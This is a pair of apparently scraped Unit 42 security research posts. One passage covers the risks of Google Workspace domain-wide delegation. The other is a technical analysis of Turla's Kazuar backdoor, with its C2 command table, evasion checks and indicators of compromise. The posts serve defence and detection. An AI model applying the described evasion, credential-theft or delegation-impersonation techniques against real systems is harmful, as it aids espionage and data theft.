visibility settings.\nFor example, an administrator can enforce policies that prevent users from publicly sharing files and limit sharing options to ensure files remain within authorized boundaries.\nA common use case for a link between GCP and Google Workspace is when an application hosted on GCP needs to interact with one of the Google Workspace services.\nThese services include the following: - Gmail - Calendar - Drive - Docs This integration allows the application to access and manipulate user-specific data, perform actions on behalf of users, or leverage the collaboration and productivity features of Google Workspace.\nA delegated GCP service account is required to create an application that interacts with Google services, accesses Google APIs, handles users' data or performs actions on their behalf.\nWhat Is a Service Account?\nA service account is a special type of account in GCP that represents nonhuman entities, such as applications or virtual machines.\nIt allows them to authenticate and interact with Google APIs.\nA service account is associated with the application itself rather than an individual end user.\nService accounts are not members of your Google Workspace domain, unlike user accounts.\nThey aren't subject to domain policies set by Google Workspace administrators and can only access users' data if they are granted domain-wide delegation.\nWhat Is Domain-Wide Delegation?\nDomain-wide delegation is a feature in Google Workspace that allows GCP service accounts to access Google Workspace users' data and to act on their behalf within a specific domain.\nWhen using the domain-wide delegation feature, applications can act on behalf of users in a Google Workspace domain without requiring individual users to authenticate and authorize the application.\nOnly a Google Workspace super admin can authorize an application, acting as the service account, to access data on behalf of users in a domain.\nThis authorization is called “delegating domain-wide authority\" to a service account.\nHow Does Domain-Wide Delegation Work?\nTo use the domain-wide delegation feature, the following steps (shown in Figure 2) are required: - Enabling Domain-Wide Delegation: The Google Workspace super admin grants domain-wide delegation for a service account, along with a set of OAuth scopes allowed for that access.\nThese scopes detail which specific services and specific actions the service account will have access to.\nFor example, if just the scope /auth/gmail.readonly is granted, the service account will have access to read a user’s Gmail messages when acting on behalf of that user, but not their other Workspace data such as access to files in Drive. -\nRequesting Google Workspace Access Token: The application sends a request to the Google Workspace token endpoint with the appropriate credentials.\nThis includes the service account's client ID and client secret, as well as the desired scopes for accessing the user data.\nIf the request is valid and the service account has been granted the necessary domain-wide delegation privileges, the token endpoint responds with an access token.\nThe application can use this access token to access user data across the domain within the limits of the scopes requested. -\nAPI Access: The application includes the access token in API requests as an authorization header, and it acts as proof of authentication and authorization on behalf of the service account.\nWhen granted domain-wide delegation, a service account in Google Workspace can access user data, act on their behalf and authenticate requests to Google APIs.\nThe specific capabilities and data accessible depend on the defined scopes.\nUnderstanding the Risks and Implications of the Domain-Wide Delegation Feature Once the domain-wide delegation is granted to a GCP service account, a GCP identity with the necessary permission can generate an access token to a delegated service account in the same project.\nA malicious insider can then use this access token to impersonate Google Workspace users, granting unauthorized access to the users' data or performing operations on their behalf.\nThis scenario creates a mismatch between the sensitivity of the domain-wide delegation permission and the permission model managed on the GCP platform.\nGoogle documentation includes a cautionary notice concerning the domain-wide delegation feature, which outlines the significant capabilities of this feature.\nGoogle mentions that, “For this reason, only super admins can manage domain-wide delegation, and they must specify each API scope that the app can access.”\nGoogle has an article suggesting not using automatic role grants for Service Accounts, which in the described case would have prevented the creation of a default Google Compute Engine Service Account.\nTo help reduce excess permissions, Google has documentation on GCP role recommendations best practices, which also mentions their \"Recommender API\" tool.\nUsing Audit Logs From Both Ends to Identify Potential Misuse It is impossible to understand the complete picture of the activity and identify any potential misuse of the domain-wide delegation feature without analyzing the audit logs from both platforms, GCP and Google Workspace.\nThe generation of a service account key log will appear in GCP logs while Google key generation and API call execution logs will appear in Google Workspace logs.\nIn Figure 3, there is an XQL query from the Cortex web interface that is searching for service account key creation in GCP audit logs.\nFigure 5 shows an XQL query that searches for the service account authorization log.\nFigure 7 shows we checked who gave this service account domain-wide delegation permission and when that happened.\nFigure 9 shows the alert “A Google Workspace admin has enabled domain-wide delegation to a GCP service account and granted him access to a sensitive scope” was triggered in the Cortex web interface.\nMitigation The security risk we have identified lies in the mismatch between the initial permissions necessary for a malicious insider to misuse the domain-wide delegation feature and the potential impact.\nOptimal security practices for service accounts with domain delegation permissions are to position them within a higher-level folder in the GCP hierarchy.\nIn the GCP hierarchy model, access control is hierarchical.\nPermissions and policies set at a higher level (e.g., organization or folder) do not automatically grant access to lower-level folders or projects.\nAccess control is not inherited downward in the hierarchy, meaning that lower-level folders or projects do not have automatic access to higher-level ones.\nThis strategy reduces the surface area for security breaches by potential malicious insiders who would normally only have permissions within lower-level folders or projects within the GCP hierarchy shown in Figure 10.\nYou can stop entities in lower-level areas from getting the service account's access tokens by making sure that only entities in the same or higher-level folders or projects can generate access tokens to the delegated service account.\nThis helps prevent the misuse of domain-wide delegation permissions and prevents access to Google Workspace data.\nConclusion We’ve been discussing this issue with Google through a variety of contact points since June 2023.\nThis issue was also identified by Team Axon, which they have also reported to Google.\nThere are risks and implications associated with the domain-wide delegation feature that security defenders need to consider when configuring this permission.\nDepending on the scope that was granted with the domain-wide delegation, an attacker can use the feature to impersonate Google Workspace users, perform actions on their behalf and gain unauthorized access to their data.\nIt’s important to highlight the mismatch between the initial permissions required for the attacker to misuse this feature, and the possible impact.\nIn worst cases, an attacker or a malicious insider can leak sensitive Google Workspace data, such as emails, documents, and other confidential information stored within the domain.\nPalo Alto Networks customers receive protection from the issue discussed in this article through both Cortex XDR and Prisma Cloud.\nCortex XDR capabilities can identify and alert on various abnormal activities such as the granting of domain wide delegation permissions or the creation of GCP service account keys.\nCortex XDR is able to learn the behavior of GCP and Google Workspace entities and detect unusual behavior.\nPrisma Cloud CIEM can help mitigate risky and over-privileged access by providing: - Visibility, alerting, and automated remediation on risky permissions - Automatic findings of unused permissions with Least-privilege access remediations Prisma Cloud Threat Detection capabilities can alert on various identity-related anomalous activities such as unusual usage of credentials from inside or outside of the cloud.\nPrisma Cloud can also perform runtime operation monitoring and provide governance, risk and compliance (GRC) requirements for any component associated with their cloud environment.\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nDisclosure Timeline - June 27, 2023: Palo Alto Networks submitted a report about the domain-wide delegation security risk to the Google Workspace product team. -\nJuly 10, 2023: Security discussion between Google Workspace product team and Palo Alto Networks cloud research group. -\nJuly 18, 2023: Palo Alto Networks submitted a report to the Google Vulnerability Reward Program regarding this issue. -\nAug. 2, 2023: Palo Alto Networks filed a bug with the Google Workspace product team and they replied that they would implement a fix if required. -\nAugust 2023: Palo Alto Networks notified Google of the intention to publish on the security risk and offered the opportunity for fixes or input. -\nNov. 8, 2023: Palo Alto Networks invited Google’s input on our article on the domain-wide delegation security risk.","num_sentences":91,"metadata":{"source":"blog","platform":"Unit42","filename":"Google-Workspace"}}
{"id":80,"title":"Over the Kazuar’s Nest: Cracking Down on a Freshly Hatched Backdoor Used by Pensive Ursa (Aka Turla)","publish_date":"2023-07-28","link":"https://unit42.paloaltonetworks.com/pensive-ursa-uses-upgraded-kazuar-backdoor/","clean_text":"Executive Summary While tracking the evolution of Pensive Ursa (aka Turla, Uroburos), Unit 42 researchers came across a new, upgraded variant of Kazuar.\nNot only is Kazuar another name for the enormous and dangerous cassowary bird, Kazuar is an advanced and stealthy .NET backdoor that Pensive Ursa usually uses as a second stage payload.\nPensive Ursa is a Russian-based threat group operating since at least 2004, which is linked to the Russian Federal Security Service (FSB).\nThe Ukrainian CERT reported in July 2023 that this version of Kazuar was targeting the Ukrainian defense sector.\nThe threat group behind this variant was going after sensitive assets such as those found in Signal messages, source control and cloud platforms data.\nSince Unit 42’s discovery of Kazuar in 2017, we have seen it in the wild only a handful of times, targeting mostly organizations in the European government and military sectors.\nThe Sunburst backdoor has been tied to Kazuar by code resemblance, which demonstrates its complexity level.\nSince late 2020, we had not seen new Kazuar samples in the wild – yet reports suggested Kazuar was under constant development.\nAs the code of the upgraded revision of Kazuar reveals, the authors put special emphasis on Kazuar’s ability to operate in stealth, evade detection and thwart analysis efforts.\nThey do so using a variety of advanced anti-analysis techniques and by protecting the malware code with effective encryption and obfuscation practices.\nThis article provides a deep technical analysis of Kazuar’s capabilities.\nWe are sharing this research to provide detection, prevention and hunting recommendations to help organizations strengthen their overall security posture.\nAn additional list of artifacts will be provided in an appendix linked to our GitHub page.\nPalo Alto Networks customers receive protections from and mitigations for the threats mentioned in this article in the following ways: - Next-Generation Firewall with the Advanced Threat Prevention security subscription can help block the malware C2 traffic - Organizations can engage the Unit 42 Incident Response team for specific assistance with this threat and others - The Cortex XDR and XSIAM platform detects and prevents the threats mentioned in this article - The Advanced WildFire machine-learning models and analysis techniques have been reviewed and updated in light of this new Kazuar variant.\n| Related Unit 42 Topics | Backdoors, Pensive Ursa | Kazuar Overview Kazuar is known for being an advanced and stealthy .NET backdoor that Pensive Ursa usually uses as a second stage payload, delivered together with other tools that the threat group commonly uses.\nThe recent campaign that the Ukrainian CERT reported unveiled the multi-staged delivery mechanism of Kazuar, together with other tools such as the new Capibar first-stage backdoor.\nOur technical analysis of this recent variant – seen in the wild after years of hiatus – showed significant improvements to its code structure and functionality.\nThis post will detail previously undocumented features, including: - Comprehensive system profiling - Extensive data collection. -\nCredential theft of cloud and other sensitive applications - Theft of cloud application accounts, source control and Signal messaging application. -\nExtended set of commands - A total of 45 supported commands to execute, received from another Kazuar node or the command and control (C2) server. -\nEnhanced task automation - A range of automated tasks that the attacker could turn on/off. -\nVariable encryption schemes - Implementation of different encryption algorithms and schemes. -\nInjection modes - Multiple injection modes, allowing Kazuar to run from different processes and execute different features.\nSince at least 2018, variants of Kazuar changed their obfuscation methods and methodically modified its compilation timestamps.\nSome variants used the ConfuserEx obfuscator to encrypt strings, and others used a custom method.\nIn the Kazuar variant analyzed in this blog, the authors went a step further, implementing multiple custom methods for string encryption.\nUnlike with previous variants, the authors only focused on targeting the Windows operating system.\nClarification note: While analyzing Kazuar’s code, we used dnSpy to export the code into an integrated development environment (IDE) and decrypted the strings using a custom script.\nThis allowed us to edit separate .cs files and edit some of the method names into meaningful ones.\nWe have interpreted the method names that appear in the screenshots.\nLatest Kazuar Variant Detailed Technical Analysis Metadata Reports from other research organizations have shown that the authors of Kazuar have manipulated their samples’ timestamps since at least 2018.\nThis new variant’s compilation timestamp is Thursday, November 20, 2008 10:11:18 AM GMT.\nUnlike other publicly available variants, this is the first time the authors went back as far as 2008 when faking the timestamp.\nKazuar also contains hard-coded, hashed identifiers for the Agent version and BuildID as well as an Agent label.\nThese can be used as variant identifiers, as shown in Figure 1.\nInitialization Executing Assembly Check When executing Kazuar, it uses the Assembly.\nLocation property to receive its own file path and check its name.\nKazuar will continue execution only if the returned value is an empty string, as shown in Figure 2.\nThe Assembly.\nLocation property returns an empty string when loading the file from a byte array.\nThis check appears to be a simple form of an anti-analysis mechanism, to ensure that the execution of the malware was done by the intended loader and not by other means or software.\nKazuar will execute if its filename matches a specific hard-coded hashed name (using the FNV algorithm).\nThis behavior is probably meant for debugging purposes, letting the authors avoid using the loader each time they debug the malware.\nOperational Root Directory Creation Kazuar creates a new directory to store its configuration and log data.\nIt uses %localappdata% as the main storage path and determines its root directory from a list of hard-coded paths (See Appendix).\nKazuar chooses which root directory, folder names, filenames and file extensions to use based on the machine globally unique identifier (GUID), as shown in Figure 3.\nAlthough these names might seem randomly generated at a first glance, the usage of the GUID means they will keep the same name for each execution of the malware on the same infected machine.\nLike in previous variants, Kazuar uses a structured directory scheme to save its log files and other data such as individual configuration files and keylogger data.\nDirectory naming is pseudorandom and chosen based on hashing.\nExamples include the custom implementation of the FNV hashing algorithm seen in previous variants, and other manipulations on the GUID value.\nYou can find a list of the directories in their plaintext names in the Appendix.\nIt is also worth mentioning that there is a currently unreferenced option to create a file called wordlist in the code.\nThis file could give us a clue about a feature not yet implemented, perhaps using a wordlist for directories, filenames or password brute forcing.\nConfiguration Files The malware creates a separate main configuration file that includes data including the following: - C2 servers - Injection mode - Other operational configuration data Figure 4 shows a snippet from this file below.\nYou can find the encryption methods for Kazuar’s configuration files in the Appendix.\nMutex Name Generation Kazuar is using a mutex to check its injection into another process.\nKazuar generates its mutex name by XORing the current process ID with the hard-coded value 0x4ac882d887106b7d and then XORing it with the machine's GUID, as depicted in Figure 5.\nThis means that several Kazuars can operate in tandem on the same device, just not injected into the same process.\nArchitecture Setting Kazuar’s Injection Modes The new version of Kazuar uses what it describes in the configuration as “injection modes” as shown in Table 1.\nThe default mode is inject.\n| Configuration file mode name | Description | Inbound traffic | Outbound traffic | Additional functionality threads | | inject | | Named pipe | Named pipe | | | zombify | | Named pipe | HTTP | | | combined | In case the default inject method fails, it executes via the same method as zombify | N/A | N/A | N/A | | remote | Creates a named pipe communication channel and serves as a proxy for other Kazuar instances, no C2 communication | Named pipe | Named pipe | | | single | | Named pipe or HTTP | Named pipe or HTTP | | | Not in User Interactive Mode | In case Kazuar’s execution is in a user interactive mode, which could occur when executing Kazuar as a service or on a machine with no GUI such as a server.\n| Named pipe | Named pipe | | Table 1.\nKazuar injection modes and descriptions.\nIn zombify mode, Kazuar is injected into the user’s default browser and has a fallback mechanism to inject itself to svchost.exe in case the query for the default browser fails.\nFigure 6 shows that the term zombify addresses process injection in general by Kazuar’s authors.\nMultithreading Model Kazuar operates in a multithreading model, while each of Kazuar’s main functionalities operates as its own thread.\nIn other words, one thread handles receiving commands or tasks from its C2, while a solver thread handles execution of these commands.\nThis multithreading model enables Kazuar’s authors to establish an asynchronous and modular flow control.\nFigure 7 shows the task solver flow.\nThe Task Solver Component - Kazuar’s Puppeteer Kazuar receives new tasks, solves them and writes the output into result files.\nA solver thread is handling new tasks received from the C2 servers or another Kazuar node.\nThe task content is then encrypted and written to disk into a task file.\nEach task file implements a hybrid encryption scheme: - Using RNGCryptoServiceProvider to generate two byte-arrays containing random numbers, which are 16 and 32 bytes long respectively. -\nUsing the first array as an AES (Rijndael) initialization vector (IV). -\nUsing the second array as an AES key. -\nGenerating an HMACMD5 hash based on the result’s content from memory, prior to its encryption and writing to disk, using the array described in the first bullet above as the key. -\nEncrypting the HMACMD5 hash, AES key and IV with the hard-coded RSA key, and writing the encrypted BLOB to the beginning of the file.\nBy using the fast AES algorithm to encrypt larger objects such as the result’s contents, and using the slower RSA encryption to conceal the AES key and IV, Kazuar improves its performance.\nThis also disables the option of recovering infected files only from disk, since the symmetric key is encrypted using an asymmetric key. -\nUsing the AES encryption to encrypt the result file’s contents.\nAs shown in Figure 8, once a task is complete, the generated result file will be saved to disk.\nIn addition to the aforementioned encrypted data, Kazuar writes the following fields to the beginning of the result file: - Four zero bytes (we believe this serves as a sort of a delimiter) - Generated result identifier - Length of the encrypted GUID, using the same XOR algorithm as in the initialization part (the encrypted message here is “System info at [datetime] (-07)”) - The encrypted GUID itself - RSA encrypted HMACMD5 hash + IV + AES key - The AES encrypted task content Figure 9 shows the encrypted result file content from disk.\nStrings Encryption Kazuar’s code includes a high volume of strings that are related to functionality and debugging.\nWhen revealed in plain text, they shed light on the inner workings and functionality of Kazuar.\nTo avoid the scenario of researchers creating strings-based indicative YARA and hunting rules, Kazuar’s strings are encrypted.\nIt decrypts each string at runtime.\nKazuar uses a variation of a Caesar Cipher for the string encryption/decryption algorithm.\nIn this algorithm, Kazuar implements a dictionary that simply swaps the key and value of each member.\nRecent Kazuar variants implemented only one dictionary, while the new variant implements multiple dictionaries, each containing 80 pairs of characters as shown in Figure 10.\nFigure 11 shows a loop iterating over a given string, and checking if the ordinal value of a given character is in the dictionary keys of the relevant class.\nIf it is, Kazuar swaps the key and value and appends it to the crafted string.\nOtherwise, it keeps the original character.\nIn addition to the string obfuscation, the authors have given unmeaningful names to the classes and methods in the code, to make analysis more difficult.\nOne of the strings decoded by Kazuar returns the value “Invalid pong responce” as shown in Figure 12.\nIt seems that one of the malware coders forgot to switch the Russian C for an English S. Core Functionality In a fashion typical to Pensive Ursa, to avoid takedowns, Kazuar uses hijacked legitimate websites for its C2 infrastructure.\nIn addition, as mentioned in the Injection Modes section, Kazuar also supports communication over named pipes.\nIt uses both mechanisms to receive remote commands, or tasks (as described in the code).\nSupported C2 Commands Kazuar supports 45 different tasks it can receive from its C2, as shown in Table 2.\nThis is yet another development in Kazuar’s code, as previous research hadn’t documented some of these tasks.\nBy comparison, Kazuar’s first variant analyzed back in 2017 supported only 26 C2 commands.\nWe have grouped Kazuar’s commands into the following categories: - Host data collection - Extended forensic data collection - File manipulation - Arbitrary command execution - Interaction with Kazuar’s configuration - Registry querying and manipulation - Scripts execution (VBS, PowerShell, JavaScript) - Custom network requests - Credentials and sensitive information stealing | Command | Description | | sindex | Searches for properties of files with the following extensions: .txt, .ini, .config, .vbs, .js, .ps1, .doc, .docx, .xls, .xlsx, .ppt, .pptx under folders in the C:\\Users\\ path.\n| | scrshot | Takes a screenshot of the window of a specified process | | move | Moves a file from a source path to a destination path | | info | Gets system information about one or multiple of the fields (described in Appendix) | | steal | Steals data from various browsers and applications (full list ID in Appendix) | | run | Executes a specified executable with supplied arguments, save the output to a temporary file, and upload the file to the C2 server.\n| | schlist | Gets data about scheduled tasks using the Schedule.\nService COM object | | config | Updates Kazuar’s configuration file | | netuse | Connects or removes network resources from the machine using the WNetAddConnection2 and WNetCancelConnection2 WinAPIs | | log | Adds a custom log to the log file | | delegate | Sends a command to another Kazuar implant on a remote system using a PIPE | | eventlog | Gets Windows Event log entries | | get | Uploads files from a specified directory to Kazuar’s C2 servers, choosing which files to upload based on their modified, accessed and created timestamps.\n| | autoruns | Checks various possibilities for software to have persistence in the infected machine (checks described in Appendix) | | put | Writes received data to a specified file on the system.\n| | regwrite | Sets a registry key/value.\n| | autoslist | Lists the number of files that were created under the Autos functionality | | vbs | Executes a VBScript | | psh | Executes a PowerShell Script | | sleep | Sets Kazuar to sleep for a specified amount of time | | regdelete | Deletes a registry key/value | | timelimit | Sets a time limit for a task from the server | | dlllist | Gets all loaded modules of a specified process | | autosget | Sends files created by the Autos functionality to the C2 | | wmiquery | Executes a WMI Query | | dotnet | Executes a .NET method received from the C2 | | tasklist | Gets a list of running processes | | find | Finds a specified directory and lists its files.\nIt appears the actor can specify which files to list based on their modified, accessed and created timestamps as well.\n| | peep | Executes a command related to the peeps functionality, which we have described in the peeps section.\n| | forensic | Checks the system for multiple forensic artifacts (see Appendix) | | kill | Kills a process by name or by process identifier (PID) | | regquery | Queries a registry key | | chakra | Executes Javascript using ChakraCore | | http | Creates a crafted HTTP request | | pipelist | Gets open pipe list for a specific machine | | jsc | Executes JavaScript | | wmicall | Calls a WMI method | | autosdel | Deletes files created by the Autos functionality | | del | Deletes a specified file OR folder.\nAllows the attacker to supply a flag to securely delete a file by overwriting the file with random data before deleting it.\n| | nbts | Crafts a NetBIOS request | | copy | Copies a specified file to a specified location.\nThe attacker is able to overwrite the destination file if it already exists.\n| | upgrade | Downloads an upgrade to the malware | | cmd | Executes a command via cmd.exe | | unattend | Steals files related to various windows configuration or cloud applications credentials (full list of files is included in Appendix) | | autosclear | Clears the Autos log list of files | Table 2.\nKazuar’s supported C2 commands.\nCloud, Source Control and Messaging Apps Credential Theft Kazuar has the capability to attempt to steal credentials from many artifacts in the infected computer, by receiving the commands steal or unattend from the C2.\nThese artifacts include multiple well-known cloud applications.\nKazuar can attempt to steal sensitive files that contain credentials for these applications.\nArtifacts targeted by Kazuar include Git SCM (a source control system that is popular among developers), as shown in Figure 13, and Signal (an encrypted messaging service for private instant messaging).\nWe have included the full description of the artifacts in the Appendix.\nComprehensive System Profiling When Kazuar is initially spawning a unique solver thread, the first task it automatically executes is the extensive collection and profiling of the targeted system, named by Kazuar’s authors as first_systeminfo_do.\nAs part of this task, Kazuar will collect extensive information about the infected machine and will send it to the C2.\nThis includes information on the operating system, hardware and network.\nThe Appendix includes the entirety of what the attackers collected.\nKazuar saves this data into an info.txt file and saves the execution logs to a logs.txt file.\nAs mentioned in the Task Solver section, we can see the result in memory.\nIn this case, it’s an archive, as depicted in Figure 14.\nBesides the two aforementioned text files, as part of this task, the malware takes a screenshot of the user’s screen.\nFigure 15 shows the zipping of all of these files into one archive before being encrypted and sent to the C2.\nCreating Automated Tasks (Autos) Kazuar has the ability to set up automated tasks that will run at specified intervals to gather information from the infected machines.\nFigure 16 shows an example of this functionality as documented in Kazuar’s configuration.\nThese automated tasks include the following: - Gathering system information (described in the section on Comprehensive System Profiling) - Taking screenshots - Stealing credentials (listed in full in the Appendix) - Getting forensics data (see Appendix) - Getting auto-runs data (see Appendix) - Getting files from specified folders. -\nGetting a list of LNK files - Stealing emails using MAPI Monitoring Active Windows (Peeps) Kazuar has the ability to let attackers set up what they called “peep rules” in the configuration.\nAlthough Kazuar does not come with these rules set out of the box, according to the malware’s code, it appears that this functionality enables the attacker to monitor the windows of specified processes.\nThis allows the attacker to track user activity of interest on the compromised machine.\nCommunication With the Command and Control HTTP Prior to establishing a communication channel with a C2 server, and in addition to the aforementioned anti-analysis checks, Kazuar checks the configuration data-sending time intervals.\nThis check includes determining whether it should send data over the weekend or not.\nUpon first communication, Kazuar sends the collected data (described in the Comprehensive System Profiling section) in an XML format and expects to get an XML structured response back with a new task.\nFigure 17 shows the HTTP request.\nKazuar uses a hard-coded value 169739e7-2112-9514-6a61-d300c0fef02d casted to a string and Base64 encoded as the cookie.\nKazuar generates key names for the XML and Base64 encrypts the content prior to sending it to the C2.\nThe content of the XML contains: - Encrypted content of the result file - Result identifier - Pseudorandom 4-byte numbers, probably another type of identifier - An array with values pseudorandomly generated based on the machine’s GUID - The hard-coded GUID connection string 169739e7-2112-9514-6a61-d300c0fef02d - The machine’s unique GUID Communication Using Named Pipes In addition to direct HTTP communication with the C2, Kazuar has the ability to function as a proxy, to receive and send commands to other Kazuar agents in the infected network.\nIt is doing this proxy communication via named pipes, generating their names based on the machine’s GUID.\nKazuar uses these pipes to establish peer-to-peer communication between different Kazuar instances, configuring each as a server or a client.\nThe named pipe communication supports the remote requests shown in Table 3.\n| Remote Request | Kazuar’s Response | Description | | PING | PONG | Return a message with the current instance process information | | TASK | RESULT | Start a received task and return a result | | LOGS | ERROR | Retrieve error logs | Table 3.\nKazuar requests and responses using named pipes.\nAnti-Analysis Checks Kazuar uses multiple anti-analysis techniques based on a series of elaborate checks, to ensure it is not being analyzed.\nThe authors programmed Kazuar to either continue if the coast is clear, or to remain idle and cease all C2 communication if it is being debugged or analyzed.\nWe can group these checks into three main categories: honeypot, analysis tools and sandbox.\nAnti-Dumping Because Kazuar is not designed to run as a standalone process but rather lives injected within another process, dumping its code is possible from memory of the injected process.\nTo prevent that from happening, Kazuar uses a powerful feature of .NET, which is the System.\nReflection Namespace.\nThis gives Kazuar the ability to gather real-time metadata about its assembly, methods and more.\nKazuar checks if it has set the antidump_methods setting to true, then overrides the pointers to its custom methods, while ignoring generic .NET methods, essentially wiping them from memory (as Kazuar’s logged message states).\nThis ultimately prevents researchers from dumping an intact version of the malware.\nHoneypot Check One of the first things Kazuar specifically searches for is the existence of Kaspersky honeypot artifacts on the machine.\nIt uses a hard-coded list of specific process names and filenames to do this.\nIf Kazuar finds more than five of these files or processes, it will log that it found a Kaspersky honeypot.\nFigure 18 shows these filenames.\nAnalysis Tools Check Kazuar has a list of hard-coded names of different popular analysis tools such as the following: - Process Monitor - X32dbg - DnSpy - Wireshark It goes over the list of running processes, and if one of these tools is running, Kazuar will log that it found analysis tools (see Appendix).\nSandbox Check Kazuar has a list of hard-coded known sandbox libraries.\nIt checks for the presence of certain DLLs that belong to different sandbox services.\nIf the malware finds these files, it determines that it is being executed in a lab (see Appendix).\nEvent Log Monitor Kazuar collects and parses events from the Windows event logs.\nFigure 19 shows Kazuar specifically looking for events from the following antivirus/security vendors: - Kaspersky Endpoint Security - Symantec Endpoint Protection Client - Microsoft Windows Defender - Doctor Web Same as with checking for Kaspersky’s honeypot, a plausible explanation would be that these security products are popular with their victims.\nStrengthening Kazuar’s Connection to Pensive Ursa As mentioned above, when composing its initial HTTP POST request to its C2, Kazuar uses the machines GUID or a hard-coded GUID 169739e7-2112-9514-6a61-d300c0fef02d as a cookie, which is then type casted to string and Base64 encoded.\nSearching the latter value in its string format (169739e7211295146a61d300c0fef02d) yields a report [PDF] by the Swiss CERT, which analyzes an attack carried out by Pensive Ursa against RUAG.\nRUAG Holding is a Swiss company from the aerospace and defense sector.\nIn addition, Kazuar’s tasks and results architecture, including the hybrid AES + RSA encryption scheme and other clear similarities in functionality, are the very image of Carbon’s modus operandi.\nIt is mentioned both in the Swiss’s CERT report and another report by ESET.\nCarbon is another second stage backdoor that was attributed multiple times to Pensive Ursa, whose code was a fork of Snake, as mentioned by CISA.\nThese findings, along with the reports by multiple CERTs, further support the previous Unit 42 assumptions proposing that Kazuar might be Carbon’s successor.\nMost importantly, these findings strengthen the attribution of Kazuar to Pensive Ursa.\nConclusion We examined the newest Kazuar malware variant that we detected in the wild.\nNotable features include the following: - Robust code and string obfuscation techniques - A multithreaded model for enhanced performance - A range of encryption schemes implemented to safeguard Kazuar’s code from analysis and to conceal its data whether in memory, during transmission or on disk All the aforementioned features are designed to provide the Kazuar backdoor a high level of stealth.\nOther noteworthy characteristics of this malware are: - Its anti-analysis functionalities - Extensive system profiling capabilities - The specific targeting of cloud applications This version of Kazuar also supports an array of over 40 distinct commands, half of which were previously undocumented.\nWe encourage security practitioners and defenders to study this report and use the information provided to enhance current detection, prevention and hunting practices to overall strengthen their security posture.\nCortex XDR Detection and Prevention Figure 20 shows Cortex XDR detected and prevented the execution of Kazuar.\nAs detailed in the technical analysis section, by default Kazuar injects its code into explorer.exe.\nWhen configured to operate on detect mode, Cortex XDR detects the malicious activity originating from the injected explorer.exe, as depicted in Figure 20 below.\nExecution of native code by Kazuar for process injection and WMI execution triggered several alerts, as well as other suspicious and uncharacteristic activity carried out by explorer.exe.\nWe detailed the alerts, including the alert shown in Figure 20, in Figure 21 below.\nIn addition, Figure 22 documents and details the directory and files that the malware created to store its configuration and logs.\nFinally, Figure 23 shows that when in prevent mode, Cortex XDR prevents the Kazuar malware executable and triggers the alert pop-up accordingly.\nProtections and Mitigations The Cortex XDR platform detects and prevents the execution flow described in the screenshots included in the previous section.\nIn addition to the classic detection, the unique SmartScore engine translates security investigation methods and their associated data into a ML-driven hybrid risk scoring system.\nFigure 24 shows that the Kazuar variant and its related incident detailed in this blog scored 97 out of 100 by SmartScore.\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this group.\nCortex XDR and XSIAM detect user and credential-based threats by analyzing user activity from multiple data sources including the following: - Endpoints - Network firewalls - Active Directory - Identity and access management solutions - Cloud workloads Cortex XDR and XSIAM build behavioral profiles of user activity over time with machine learning.\nBy comparing new activity to past activity, peer activity and the expected behavior of the entity, Cortex XDR and XSIAM detect anomalous activity indicative of credential-based attacks.\nIt also offers the following protections related to the attacks discussed in this post: - Prevents the execution of known malicious malware and also prevents the execution of unknown malware using Behavioral Threat Protection and machine learning based on the Local Analysis module - Protects against credential gathering tools and techniques using the new Credential Gathering Protection available from Cortex XDR 3.4 - Protects against exploitation of different vulnerabilities including ProxyShell and ProxyLogon using the Anti-Exploitation modules as well as Behavioral Threat Protection - Cortex XDR Pro and XSIAM detect postexploit activity, including credential-based attacks, with behavioral analytics - Next-Generation Firewall with the Advanced Threat Prevention security subscription can help block the malware C2 traffic via the following Threat Prevention signature: 86805. -\nThe Advanced WildFire machine-learning models and analysis techniques have been reviewed and updated in light of this new Kazuar variant.\nMultiple products in the Palo Alto Networks portfolio leverage Advanced WildFire to provide coverage against Kazuar variants and other threats.\nIf you think you might have been impacted or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nIndicators of Compromise Kazuar SHA256 - 91dc8593ee573f3a07e9356e65e06aed58d8e74258313e3414a7de278b3b5233 Command and Control Servers - hxxps://www.pierreagencement[.]fr/wp-content/languages/index.php - hxxps://sansaispa[.]com/wp-includes/images/gallery/ - hxxps://octoberoctopus.co[.]za/wp-includes/sitemaps/web/ RSA Keys 7ondEZo8ZjYh+FP4h3PgJBU/yTlO+g8ZbCF0wx8eocnqxLS4YWI9hG3SI2hlEBz6J4vvxPCrs/jazekolaZLQnbyOCyH53I+We+x32d2lUlXrtZA/0oJa39tW2t2NsUG/xPqsY3rBCuhi28hl30XH8Arn2/u9Jxl1G9dNxFDdVxk9ePjlHecdAtWCa9vmC4HY0Wlqyhd0+hJfvKCoKLsHuCyl4b/c343VVVTFubYNSFJMQnpIKsYQDRKtRszQuS1Ls+obyOr+0cbAmnKb8twTsq862pA6MzxRr16/4/1nyrNKuDS+OvPfv3tgvssybtGwN8D8Qac7O1FM722Nft16iis9WaoFuXCwP/LCkaetQMjEKN07H6ESHMnUc+JDvINIspAAKK8fRwtTcWKrG2bh/Dwtneq/9L1Pv2cKtpQAUlxVfQX5I/mtATEHIMcPOvNWRUqmSssDHEJiZDFKS45SjoG4qXs536xwbZ4k6lmHUUOVzkmCc71HooxRdSYx1M7Vqvou1Mi39O6vJouL2aTO6ymbGdnerKavDsgBSa2HKRbP2Nym6Ud4WAhiaqnPCWGnJz7l+4Hs++OcG2p+Ct1oXRecLK6Zy/n9moTZeijLdqJwUh90Bht8V8STz/vNtrhz++Do6DsDssENkOHXeUeRCqCmDdS3sqkxQnGAG3tGvc= AQAB 